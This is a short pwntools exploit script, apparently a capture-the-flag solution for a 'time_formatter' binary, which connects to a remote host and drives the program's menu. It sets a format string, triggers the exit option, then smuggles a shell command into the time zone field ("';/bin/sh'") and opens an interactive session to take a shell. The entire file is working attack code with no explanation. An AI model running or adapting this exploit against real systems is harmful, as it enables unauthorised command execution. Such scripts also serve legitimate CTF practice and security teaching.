from pwn import*
#p = process('./time_formatter')
p = remote('111.198.29.45',52670)
def Format(fmt):
	p.sendlineafter('>','1')
	p.sendlineafter('Format:',fmt)
	p.recvuntil('set.')
def time(tm):
	p.sendlineafter('>','2')
	p.sendlineafter('Enter your unix time: ',tm)
	p.recvuntil('set.')
def Zone(zn):
	p.sendlineafter('>','3')
	p.sendlineafter('Time zone:',zn)
	p.recvuntil('set.')
def Exit(var):
	p.sendlineafter('>','5')
	p.sendlineafter('?',var)
Format('%x')
Exit('~')
Zone("\';/bin/sh\'")
p.sendline('4')
p.interactive()
